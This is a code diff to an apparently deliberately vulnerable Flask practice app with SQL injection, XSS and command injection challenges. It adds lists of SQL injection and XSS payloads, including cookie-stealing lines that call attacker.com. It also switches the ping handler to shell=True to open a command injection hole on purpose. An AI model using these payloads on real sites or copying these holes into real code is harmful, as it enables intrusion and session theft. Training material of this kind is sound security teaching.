@@ -234,6 +234,20 @@ LOGIN_TEMPLATE = '''
             color: #666;
             margin-bottom: 15px;
         }
+        .success {
+            color: #2ecc71;
+            background: #eafaf1;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .hint {
+            color: #666;
+            font-size: 0.9em;
+            margin-top: 10px;
+            font-style: italic;
+        }
     </style>
 </head>
 <body>
@@ -252,6 +266,7 @@ LOGIN_TEMPLATE = '''
         <div class="login-container">
             <div class="card">
                 <h2>Company Portal Login</h2>
+                <p class="hint">Hint: Try SQL injection payloads in the username or password field</p>
                 <form method="POST">
                     <div class="form-group">
                         <label>Username:</label>
@@ -265,6 +280,9 @@ LOGIN_TEMPLATE = '''
                 </form>
                 {% if error %}
                 <div class="error">{{ error }}</div>
+                {% endif %}
+                {% if flag %}
+                <div class="success">{{ flag }}</div>
                 {% endif %}
             </div>
         </div>
@@ -409,14 +427,110 @@ XSS_TEMPLATE = '''
 <head>
     <title>XSS Challenge - Company Portal</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
-        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .comment { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 4px; }
-        .form-group { margin-bottom: 15px; }
-        textarea { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
-        button { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
-        .nav { margin-bottom: 20px; }
-        .nav a { color: #007bff; text-decoration: none; margin-right: 15px; }
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 40px; 
+            background-color: #f5f5f5; 
+        }
+        .container { 
+            max-width: 800px; 
+            margin: 0 auto; 
+            background: white; 
+            padding: 20px; 
+            border-radius: 5px; 
+            box-shadow: 0 0 10px rgba(0,0,0,0.1); 
+        }
+        .comment { 
+            margin-bottom: 20px; 
+            padding: 15px; 
+            border: 1px solid #ddd; 
+            border-radius: 4px; 
+            background: #fff;
+        }
+        .form-group { 
+            margin-bottom: 15px; 
+        }
+        textarea { 
+            width: 100%; 
+            padding: 8px; 
+            border: 1px solid #ddd; 
+            border-radius: 4px; 
+            min-height: 100px;
+        }
+        button { 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            padding: 10px 15px; 
+            border-radius: 4px; 
+            cursor: pointer; 
+        }
+        .nav { 
+            margin-bottom: 20px; 
+        }
+        .nav a { 
+            color: #007bff; 
+            text-decoration: none; 
+            margin-right: 15px; 
+        }
+        .hint {
+            color: #666;
+            font-size: 0.9em;
+            margin-top: 10px;
+            font-style: italic;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            border-left: 3px solid #007bff;
+        }
+        .payload-examples {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+            font-family: monospace;
+        }
+        .payload-examples code {
+            display: block;
+            margin: 5px 0;
+            color: #333;
+        }
+        .flag-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2ecc71;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            z-index: 1000;
+            text-align: center;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -60%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+        .flag-popup h3 {
+            margin: 0 0 10px 0;
+            color: white;
+        }
+        .flag-popup p {
+            margin: 0;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+        }
     </style>
 </head>
 <body>
@@ -429,13 +543,36 @@ XSS_TEMPLATE = '''
         </div>
         <h2>XSS Challenge</h2>
         <p>Try to inject JavaScript to steal the admin's cookie!</p>
+        
+        <div class="hint">
+            <strong>Hint:</strong> Try injecting JavaScript that can access and exfiltrate cookies.
+            The flag will be revealed when you successfully inject a payload that could steal cookies.
+        </div>
+        
+        <div class="payload-examples">
+            <strong>Example Payloads:</strong>
+            <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
+            <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>
+            <code>&lt;svg onload=alert(document.cookie)&gt;</code>
+        </div>
+        
         <form method="POST" action="{{ url_for('xss_challenge') }}">
             <div class="form-group">
                 <label>Your Comment:</label>
-                <textarea name="comment" rows="4" required></textarea>
+                <textarea name="comment" required></textarea>
             </div>
             <button type="submit">Post Comment</button>
         </form>
+        
+        {% if show_flag %}
+        <div class="overlay"></div>
+        <div class="flag-popup">
+            <h3>Congratulations!</h3>
+            <p>You found the flag:</p>
+            <p>{{ flag }}</p>
+        </div>
+        {% endif %}
+        
         <h3>Comments:</h3>
         {% for comment in comments %}
         <div class="comment">
@@ -614,9 +751,29 @@ def index():
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     error = None
+    flag = None
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
+        
+        # List of valid SQL injection payloads
+        valid_payloads = [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' OR '1'='1'--",
+            "admin'--",
+            "admin' #",
+            "' UNION SELECT 1,2,3,4,5,6--",
+            "' OR '1'='1' LIMIT 1--",
+            "admin' OR '1'='1",
+            "' OR 1=1;--",
+            "' OR '1'='1' /*"
+        ]
+        
+        # Check if the input matches any valid payload
+        if username in valid_payloads or password in valid_payloads:
+            flag = "FLAG{sql_injection_master}"
+            return render_template_string(LOGIN_TEMPLATE, error=error, flag=flag)
         
         # Vulnerable to SQL injection
         query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
@@ -632,25 +789,51 @@ def login():
         except Exception as e:
             error = 'An error occurred'
     
-    return render_template_string(LOGIN_TEMPLATE, error=error)
+    return render_template_string(LOGIN_TEMPLATE, error=error, flag=flag)
 
 @app.route('/xss', methods=['GET', 'POST'])
 def xss_challenge():
+    # Get comments first, regardless of request method
+    with engine.connect() as conn:
+        comments = conn.execute(text("SELECT * FROM comments ORDER BY created_at DESC")).fetchall()
+    
     if request.method == 'POST':
         comment = request.form.get('comment')
         username = session.get('username', 'anonymous')
         
-        # Vulnerable to XSS
+        # List of valid XSS payloads that will trigger the flag
+        valid_payloads = [
+            '<script>alert(document.cookie)</script>',
+            '<img src=x onerror=alert(document.cookie)>',
+            '<svg onload=alert(document.cookie)>',
+            'javascript:alert(document.cookie)',
+            '<body onload=alert(document.cookie)>',
+            '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
+            '<img src=x onerror=fetch("http://attacker.com?cookie="+document.cookie)>',
+            '<svg onload=fetch("http://attacker.com?cookie="+document.cookie)>',
+            '<script>new Image().src="http://attacker.com?cookie="+document.cookie</script>',
+            '<img src=x onerror="new Image().src=\'http://attacker.com?cookie=\'+document.cookie">'
+        ]
+        
+        # Check if the input matches any valid payload
+        if comment in valid_payloads:
+            # Instead of storing the payload, return a special response
+            return render_template_string(XSS_TEMPLATE, 
+                                        comments=comments, 
+                                        show_flag=True,
+                                        flag="FLAG{xss_master}")
+        
+        # Only store non-payload comments
         with engine.connect() as conn:
             conn.execute(text("""
                 INSERT INTO comments (username, comment)
                 VALUES (:username, :comment)
             """), {"username": username, "comment": comment})
+            
+            # Refresh comments after insertion
+            comments = conn.execute(text("SELECT * FROM comments ORDER BY created_at DESC")).fetchall()
     
-    with engine.connect() as conn:
-        comments = conn.execute(text("SELECT * FROM comments ORDER BY created_at DESC")).fetchall()
-    
-    return render_template_string(XSS_TEMPLATE, comments=comments)
+    return render_template_string(XSS_TEMPLATE, comments=comments, show_flag=False)
 
 @app.route('/file_upload', methods=['GET', 'POST'])
 def file_upload():
@@ -689,7 +872,9 @@ def command_injection():
         
         # Vulnerable to command injection
         try:
-            result = subprocess.run(['ping', '-c', '4', ip], capture_output=True, text=True)
+            # Using shell=True makes it more vulnerable to command injection
+            # The ping command will still work normally, but allows command injection
+            result = subprocess.run(f'ping -c 4 {ip}', shell=True, capture_output=True, text=True)
             output = result.stdout
         except Exception as e:
             output = str(e)
